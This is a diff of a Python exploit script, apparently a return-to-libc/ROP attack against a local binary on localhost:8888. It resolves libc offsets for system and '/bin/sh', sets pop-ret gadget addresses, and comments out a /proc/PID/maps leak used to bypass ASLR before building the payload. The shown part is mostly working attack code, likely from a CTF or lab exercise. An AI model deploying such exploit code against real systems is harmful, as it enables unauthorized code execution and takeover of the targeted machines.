@@ -47,25 +47,30 @@ print('[+] libc read %s' % result[0]['read'])
 print('[+] libc write %s' % result[0]['write'])
 print('[+] libc bin sh offsets %s' % result[0]['str_bin_sh'])
 
-p_pid = get_pid("rarun2").strip()
-with open('/proc/' + p_pid + '/maps') as f:
-    content = f.readlines()
-content = [x.strip() for x in content]
-libc_start_addr = 0
-for line in content:
-    elements = line.split(' ')
-    if (libc_path in elements) and (elements[1] == 'r-xp'):
-        libc_addresses = elements[0].split('-')
-        libc_start_addr = libc_addresses[0]
+# Try to bypass ASLR with proc leaking
+# p_pid = get_pid("rarun2").strip()
+# with open('/proc/' + p_pid + '/maps') as f:
+#     content = f.readlines()
+# content = [x.strip() for x in content]
+# libc_start_addr = 0
+# for line in content:
+#     elements = line.split(' ')
+#     if (libc_path in elements) and (elements[1] == 'r-xp'):
+#         libc_addresses = elements[0].split('-')
+#         libc_start_addr = libc_addresses[0]
 
-diff = int('0x7ffff72bd000', 16) - int(libc_start_addr, 16)
+# diff = int('0x7ffff72bd000', 16) - int(libc_start_addr, 16)
 
 popret  = 0x0000004006a3
 pop2ret = 0x0000004006a1
 
-libc_base = '0x7ffff79e4000'
-binsh = int(libc_base,16) + int(result[0]['str_bin_sh'],16)
-system = int(libc_base,16) + int(result[0]['system'],16)
+# Try to bypass ASLR with proc leaking
+# libc_base = '0x7ffff79e4000'
+# binsh = int(libc_base,16) + int(result[0]['str_bin_sh'],16)
+# system = int(libc_base,16) + int(result[0]['system'],16)
+
+binsh = libc_base + int(result[0]['str_bin_sh'],16)
+system = libc_base + int(result[0]['system'],16)
 
 s = socket.create_connection(('localhost', 8888))
 
